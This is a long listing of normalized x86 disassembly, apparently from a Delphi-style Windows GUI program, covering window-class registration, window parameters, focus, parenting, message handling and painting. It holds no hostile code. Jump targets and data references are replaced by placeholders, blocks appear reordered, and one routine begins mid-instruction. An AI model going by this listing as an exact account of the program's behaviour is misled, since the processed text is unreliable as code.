xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_438638
add esp 0x10
retn
sub_4386a0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43870c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_435744
test al al
je r-xdata
mov eax ebx
call sub_435774
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403360
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403360
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403360
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_438774
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_438892
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b78
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43870c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43b8e8
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4030b4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404100
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438899
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_4388a0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_438a61
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_431f00
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_431f00
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b460
call sub_4038d8
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c7f0
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c7f0
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4086e0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43bbf8
push 0x1
mov eax [ esi + 0x68 ]
call sub_41f508
mov ecx eax
mov edx 0x30
mov eax esi
call sub_4362b4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43b8e8
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a68
lea eax [ ebp - 0xc0 ]
call sub_403e9c
retn
mov eax esi
mov si 0xffee
call sub_403360
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_438a70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406a30
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_438ab0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a948
mov eax esi
call sub_41a898
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41a898
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41a950
pop esi
pop ebx
retn
sub_438ae8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41c194
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41c120
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41c120
mov eax esi
call sub_41c19c
add esp 0x10
pop esi
pop ebx
retn
sub_438b50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_438b3c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_416b18
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_416b18
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_438c28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4365ec
mov eax [ ebp - 0x8 ]
push eax
push sub_438ab0
mov eax [ ebp - 0x8 ]
push eax
push sub_438ae8
push ebp
call sub_438b50
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438c83
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_435080
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408694
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4086a8
mov ecx eax
mov edx edi
mov eax ebx
call sub_435090
mov eax r-xdata
call sub_4086b4
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_433b34
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_438cdc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_438d29
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d30
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c7f0
sub_438d40
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_416b74
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_416b18
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_438d88
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_438618
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_438d40
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4385dc
call sub_434760
inc edi
dec esi
jne r-xdata
sub_438e24
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_438e40
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_416b18
call sub_438e40
inc edi
dec esi
jne r-xdata
sub_438ea0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403360
mov ebx eax
mov eax edi
call sub_438e40
mov eax edi
call sub_438fdc
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_438ee0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_438fb6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_4362b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_416b18
call sub_438ee0
inc esi
dec ebx
jne r-xdata
sub_438fdc
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_438ee0
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43901c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_438e40
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_438fdc
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406a20
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_4362b4
jmp r-xdata
sub_4390a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4390fc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4390eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4390f2
call sub_433b34
call sub_421cf4
retn
sub_43911c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_4156bc
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406a08
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_4362b4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_4391d4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_416b18
call sub_43911c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_416b18
call sub_43911c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_439268
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b8e8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069f4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_4391d4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a08
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_4362b4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_4392fc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_435870
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_436380
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_439268
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069f4
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_434c50
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4391d4
test eax eax
je r-xdata
mov eax ebx
call sub_44bae0
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_436380
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43bbec
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43b8e8
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_4362b4
sub_439460
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_436514
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_4362b4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41fcb8
call sub_41f034
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41fcf4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434cac
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_439568
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_431fec
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_4362b4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_43959c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4396bc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4396f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4396c3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b8e8
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_416b18
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_4396f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_416b74
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_416b18
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_4156e4
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_416b18
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
